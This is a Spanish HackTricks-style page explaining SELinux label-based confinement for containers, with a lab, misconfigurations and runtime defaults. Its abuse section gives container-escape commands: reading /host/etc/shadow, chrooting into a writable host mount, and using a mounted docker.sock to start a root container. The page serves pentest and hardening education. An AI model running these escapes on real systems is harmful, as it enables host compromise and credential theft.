# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux es un sistema de **Control de Acceso Obligatorio basado en etiquetas**. Cada proceso y objeto relevante puede llevar un contexto de seguridad, y la política determina qué dominios pueden interactuar con qué tipos y de qué manera. En entornos containerizados, esto normalmente significa que el runtime inicia el proceso del container bajo un dominio confinado y etiqueta el contenido del container con los tipos correspondientes. Si la política funciona correctamente, el proceso podrá leer y escribir aquello que se espera que toque su etiqueta, mientras se le niega acceso a otro contenido del host, incluso si ese contenido se hace visible a través de un mount.

Esta es una de las protecciones del lado del host más potentes disponibles en despliegues comunes de containers en Linux. Es especialmente importante en Fedora, RHEL, CentOS Stream, OpenShift y otros ecosistemas centrados en SELinux. En esos entornos, un revisor que ignore SELinux a menudo malinterpretará por qué una vía que parece obvia hacia la compromisión del host está realmente bloqueada.

## AppArmor Vs SELinux

La diferencia más simple a alto nivel es que AppArmor es path-based mientras que SELinux es **basado en etiquetas**. Eso tiene grandes consecuencias para la seguridad de containers. Una política basada en rutas puede comportarse de manera diferente si el mismo contenido del host se hace visible bajo una ruta de mount inesperada. Una política basada en etiquetas, en cambio, pregunta cuál es la etiqueta del objeto y qué puede hacer con ella el dominio del proceso. Esto no hace que SELinux sea simple, pero sí lo hace resistente frente a una clase de trucos con rutas que los defensores a veces suponen por accidente en sistemas basados en AppArmor.

Dado que el modelo está orientado a etiquetas, el manejo de volúmenes de container y las decisiones de reetiquetado son críticas para la seguridad. Si el runtime u operador cambia las etiquetas de forma demasiado amplia para "make mounts work", el límite de la política que se suponía iba a contener la carga de trabajo puede volverse mucho más débil de lo previsto.

## Lab

Para comprobar si SELinux está activo en el host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspeccionar las etiquetas existentes en el host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar una ejecución normal con una en la que el etiquetado está deshabilitado:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
En un host con SELinux habilitado, esto es una demostración muy práctica porque muestra la diferencia entre una carga de trabajo que se ejecuta bajo el dominio de contenedor esperado y una que ha sido despojada de esa capa de aplicación de políticas.

## Uso en tiempo de ejecución

Podman está particularmente bien alineado con SELinux en sistemas donde SELinux forma parte de la configuración por defecto de la plataforma. Rootless Podman junto con SELinux es una de las bases de contenedores más sólidas en entornos mainstream porque el proceso ya es no privilegiado en el lado del host y además está confinado por la política MAC. Docker también puede usar SELinux donde se admite, aunque los administradores a veces lo desactivan para evitar fricciones con el etiquetado de volúmenes. CRI-O y OpenShift dependen en gran medida de SELinux como parte de su modelo de aislamiento de contenedores. Kubernetes también puede exponer ajustes relacionados con SELinux, pero su valor obviamente depende de si el OS del nodo realmente soporta y hace cumplir SELinux.

La lección recurrente es que SELinux no es un adorno opcional. En los ecosistemas que se construyen alrededor de él, forma parte del límite de seguridad esperado.

## Configuraciones erróneas

El error clásico es `label=disable`. Operativamente, esto suele ocurrir porque se negó un montaje de volumen y la respuesta más rápida a corto plazo fue eliminar SELinux de la ecuación en lugar de corregir el modelo de etiquetado. Otro error común es el re-etiquetado incorrecto del contenido del host. Operaciones de re-etiquetado amplias pueden hacer que la aplicación funcione, pero también pueden expandir lo que el contenedor puede tocar mucho más allá de lo originalmente previsto.

También es importante no confundir SELinux **instalado** con SELinux **efectivo**. Un host puede soportar SELinux y aun así estar en modo permisivo, o el runtime puede no estar iniciando la carga de trabajo bajo el dominio esperado. En esos casos la protección es mucho más débil de lo que la documentación podría sugerir.

## Abuso

Cuando SELinux está ausente, en modo permisivo, o deshabilitado de forma amplia para la carga de trabajo, los paths montados del host se vuelven mucho más fáciles de abusar. El mismo bind mount que de otro modo habría estado restringido por las etiquetas puede convertirse en una vía directa hacia datos del host o modificación del host. Esto es especialmente relevante cuando se combina con montajes de volúmenes escribibles, directorios del runtime de contenedores, o atajos operacionales que expusieron paths sensibles del host por conveniencia.

SELinux a menudo explica por qué un generic breakout writeup funciona inmediatamente en un host pero falla repetidamente en otro, aun cuando los flags del runtime parecen similares. El ingrediente que falta con frecuencia no es un namespace ni una capability, sino una barrera de etiquetas que se mantuvo intacta.

La comprobación práctica más rápida es comparar el contexto activo y luego sondear los paths montados del host o directorios del runtime que normalmente estarían confinados por etiquetas:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si está presente un host bind mount y el etiquetado de SELinux ha sido deshabilitado o debilitado, la divulgación de información suele producirse primero:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si el mount es escribible y el container es efectivamente host-root desde el punto de vista del kernel, el siguiente paso es probar una modificación controlada del host en lugar de adivinar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
En hosts con SELinux habilitado, la pérdida de etiquetas en los directorios de estado en tiempo de ejecución también puede exponer rutas directas de escalada de privilegios:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Estos comandos no reemplazan una cadena de escape completa, pero dejan muy claro muy rápidamente si SELinux era lo que impedía el acceso a datos del host o la modificación de archivos en el host.

### Ejemplo completo: SELinux deshabilitado + montaje del host escribible

Si el etiquetado de SELinux está deshabilitado y el sistema de archivos del host está montado como escribible en `/host`, un escape completo al host se convierte en un caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si el `chroot` tiene éxito, el proceso del contenedor ahora está operando desde el sistema de archivos del host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Ejemplo completo: SELinux deshabilitado + Directorio de runtime

Si la workload puede alcanzar un socket de runtime una vez que las labels están deshabilitadas, el escape puede delegarse al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
La observación relevante es que SELinux a menudo era el control que impedía exactamente este tipo de acceso a host-path o runtime-state.

## Checks

El objetivo de las comprobaciones de SELinux es confirmar que SELinux está habilitado, identificar el contexto de seguridad actual y comprobar si los archivos o rutas que te interesan están realmente confinados por etiquetas.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Lo interesante aquí:

- `getenforce` idealmente debería devolver `Enforcing`; `Permissive` o `Disabled` cambian el sentido de toda la sección de SELinux.
- Si el contexto del proceso actual parece inesperado o demasiado amplio, la workload puede que no se esté ejecutando bajo la política de contenedor prevista.
- Si los archivos montados desde el host o los directorios de runtime tienen labels que el proceso puede acceder con demasiada libertad, los bind mounts se vuelven mucho más peligrosos.

Al revisar un contenedor en una plataforma con capacidad SELinux, no trate el etiquetado como un detalle secundario. En muchos casos es una de las razones principales por las que el host aún no está comprometido.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Dependiente del host | La separación SELinux está disponible en hosts con SELinux habilitado, pero el comportamiento exacto depende de la configuración del host/daemon | `--security-opt label=disable`, relabeling amplio de bind mounts, `--privileged` |
| Podman | Comúnmente habilitado en hosts con SELinux | La separación SELinux es una parte normal de Podman en sistemas con SELinux a menos que esté deshabilitada | `--security-opt label=disable`, `label=false` en `containers.conf`, `--privileged` |
| Kubernetes | No se asigna generalmente automáticamente a nivel de Pod | Existe soporte para SELinux, pero los Pods normalmente necesitan `securityContext.seLinuxOptions` o valores predeterminados específicos de la plataforma; se requiere soporte del runtime y del nodo | opciones `seLinuxOptions` débiles o amplias, ejecución en nodos en permissive/disabled, políticas de la plataforma que deshabilitan el etiquetado |
| CRI-O / OpenShift style deployments | Se confía en ellas con frecuencia | SELinux suele ser una parte central del modelo de aislamiento de nodos en estos entornos | políticas custom que amplían en exceso el acceso, deshabilitar el etiquetado por compatibilidad |

Los valores predeterminados de SELinux dependen más de la distribución que los de seccomp. En sistemas estilo Fedora/RHEL/OpenShift, SELinux suele ser central en el modelo de aislamiento. En sistemas sin SELinux, simplemente está ausente.
